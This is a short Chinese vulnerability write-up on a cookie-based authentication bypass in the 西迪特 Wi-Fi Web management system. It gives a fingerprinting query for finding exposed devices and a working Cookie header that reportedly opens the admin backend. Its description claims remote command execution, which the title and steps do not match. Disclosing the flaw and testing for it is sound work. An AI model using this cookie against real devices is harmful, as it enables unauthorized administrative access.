# 西迪特 Wi-Fi Web管理 Cookie 越权访问漏洞

## 漏洞描述

西迪特 Wi-Fi Web管理系统后台过滤不足导致远程命令执行漏洞

## 漏洞影响

<a-checkbox checked>西迪特 Wi-Fi Web管理</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title=="Wi-Fi Web管理"</a-checkbox></br>

## 漏洞复现o

登录页面

![img](../../../.vuepress/public/img/1629371298672-1ceeafe8-ba9c-42c5-b873-3dfabdd0305a.png)

添加Cookie，即可登录后台

```bash
Cookie: timestamp=0; cooLogin=1; cooUser=admin
```

![img](../../../.vuepress/public/img/1629371805870-5f6a3a10-7c92-481c-97fe-46886dd474b6.png)

